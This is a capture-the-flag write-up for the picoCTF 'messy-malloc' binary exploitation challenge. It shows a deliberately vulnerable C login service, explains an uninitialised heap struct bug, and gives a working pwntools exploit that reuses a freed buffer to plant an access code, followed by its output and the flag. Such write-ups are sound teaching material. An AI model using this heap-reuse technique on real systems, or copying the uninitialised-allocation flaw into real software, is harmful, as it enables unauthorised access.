# messy-malloc
Binary Exploitation, 300 points

## Description:
> Can you take advantage of misused malloc calls to leak the secret through this service and get the flag?

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

#define LINE_MAX 256
#define ACCESS_CODE_LEN 16
#define FLAG_SIZE 64

struct user {
  char *username;
  char access_code[ACCESS_CODE_LEN];
  char *files;
};

struct user anon_user;
struct user *u;

void print_flag() {
  char flag[FLAG_SIZE];
  FILE *f = fopen("flag.txt", "r");
  if (f == NULL) {
    printf("Please make sure flag.txt exists\n");
    exit(0);
  }

  if ((fgets(flag, FLAG_SIZE, f)) == NULL){
    puts("Couldn't read flag file.");
    exit(1);
  };

  unsigned long ac1 = ((unsigned long *)u->access_code)[0];
  unsigned long ac2 = ((unsigned long *)u->access_code)[1];
  if (ac1 != 0x4343415f544f4f52 || ac2 != 0x45444f435f535345) {
    fprintf(stdout, "Incorrect Access Code: \"");
    for (int i = 0; i < ACCESS_CODE_LEN; i++) {
      putchar(u->access_code[i]);
    }
    fprintf(stdout, "\"\n");
    return;
  }
  
  puts(flag);
  fclose(f);
}

void menu() {
  puts("Commands:");
  puts("\tlogin - login as a user");
  puts("\tprint-flag - print the flag");
  puts("\tlogout - log out");
  puts("\tquit - exit the program");
}
 
const char *get_username(struct user *u) {
  if (u->username == NULL) {
    return "anon";
  }
  else {
    return u->username;
  }
}

int login() {
  u = malloc(sizeof(struct user));

  int username_len;
  puts("Please enter the length of your username");
  scanf("%d", &username_len);
  getc(stdin);

  char *username = malloc(username_len+1);
  u->username = username;

  puts("Please enter your username");
  if (fgets(username, username_len, stdin) == NULL) {
    puts("fgets failed");
    exit(-1);
  }

  char *end;
  if ((end=strchr(username, '\n')) != NULL) {
    end[0] = '\0';
  }
  
  return 0;
  
}

int logout() {
  char *user = u->username;
  if (u == &anon_user) {
    return -1;
  }
  else {
    free(u);
    free(user);
    u = &anon_user;
  }
  return 0;
}

int main(int argc, char **argv) {

  setbuf(stdout, NULL);

  char buf[LINE_MAX];

  memset(anon_user.access_code, 0, ACCESS_CODE_LEN);
  anon_user.username = NULL;

  u = &anon_user;
  
  menu();

  while(1) {
    puts("\nEnter your command:");
    fprintf(stdout, "[%s]> ", get_username(u));

    if(fgets(buf, LINE_MAX, stdin) == NULL)
      break;

    if (!strncmp(buf, "login", 5)){
      login();
    }
    else if(!strncmp(buf, "print-flag", 10)){
      print_flag();
    }
    else if(!strncmp(buf, "logout", 6)){
      logout();
    }
    else if(!strncmp(buf, "quit", 4)){
      return 0;
    }
    else{
      puts("Invalid option");
      menu();
    }
  }
}

```


## Solution:

This challenge is similar to last year's [are you root?](/2018_picoCTF/are%20you%20root.md).

We need to login as a user which has an access code allowing him to print the flag. However, there is no API to set access codes.

A user is represented using the following structure:
```c
struct user {
  char *username;
  char access_code[ACCESS_CODE_LEN];
  char *files;
};
```

The vulnerability here is the fact that after allocating memory for the user, the program only initializes the `username` field, meaning that the other members of the structure will contain leftover values from whatever the memory was previously used for.

When the program creates a user, it also asks us to enter a username with the length of our choice. So, we can ask for a username of length `sizeof(struct user)`, and fill it as if it was a `struct user` - with the correct access code (`ROOT_ACCESS_CODE`) sitting in the correct location (offset 8 from the start of the buffer). We then free the allocation by logging out, and immediately request to create a new user. The heap manager will probably provide us with the same buffer we just freed, since the requested buffer size is equal to a previously freed buffer size (an optimization to reduce memory fragmentation). This new user will have the "leftover" access code and will be able to access the flag.

```
1. Allocate First user:

          struct user
+------------------------------------+                  username buffer
| char *username: pointer            |------->+----------------------------------+
+------------------------------------+        | aaaaaaaaROOT_ACCESS_CODEbbbbbbbb |
| char access_code: unknown leftover |        +----------------------------------+
+------------------------------------+
| char *files: unknown leftover      |
+------------------------------------+

2. Free first user

3. Allocate second user (Heap Manager provides "username buffer" as buffer for user struct):

struct user (previously: username buffer)
+------------------------------------+        new username buffer
| char *username: pointer            |------->+---+
+------------------------------------+        | A |
| char access_code: ROOT_ACCESS_CODE |        +---+
+------------------------------------+
| char *files: bbbbbbbb              |
+------------------------------------+

```

The script:

```python
# First, generate a pwntools template using:
# pwn template --host 2019shell1.picoctf.com --port 12286 auth

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# FORTIFY:  Enabled

#context.log_level = "DEBUG"
AC1 = 0x4343415f544f4f52
AC2 = 0x45444f435f535345


def select_menu(io, command):
    io.sendlineafter("]> ", command)

def login(io, name):
    log.info("Logging in as {} ({})".format(name, enhex(name)))
    select_menu(io, "login")
    io.sendlineafter("Please enter the length of your username", str(len(name)))
    io.sendlineafter("Please enter your username", name)

def logout(io):
    log.info("Logging out")
    select_menu(io, "logout")
    
def print_flag(io):
    log.info("Printing flag")
    select_menu(io, "print-flag")

def quit(io):
    log.info("Quitting")
    select_menu(io, "quit")

io = start()
login(io, "a"*8 + p64(AC1) + p64(AC2) + "b"*8)
logout(io)
login(io, "A")
print_flag(io)
quit(io)
print io.recvall()
```

Output:

```console
root@kali:/media/sf_CTFs/pico/messy-malloc# python exploit.py
[*] '/media/sf_CTFs/pico/messy-malloc/auth'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    FORTIFY:  Enabled
[+] Opening connection to 2019shell1.picoctf.com on port 12286: Done
[*] Logging in as aaaaaaaaROOT_ACCESS_CODEbbbbbbbb (6161616161616161524f4f545f4143434553535f434f44456262626262626262)
[*] Logging out
[*] Logging in as A (41)
[*] Printing flag
[*] Quitting
[+] Receiving all data: Done (77B)
[*] Closed connection to 2019shell1.picoctf.com port 12286
picoCTF{g0ttA_cl3aR_y0uR_m4110c3d_m3m0rY_8aa9bc45}
```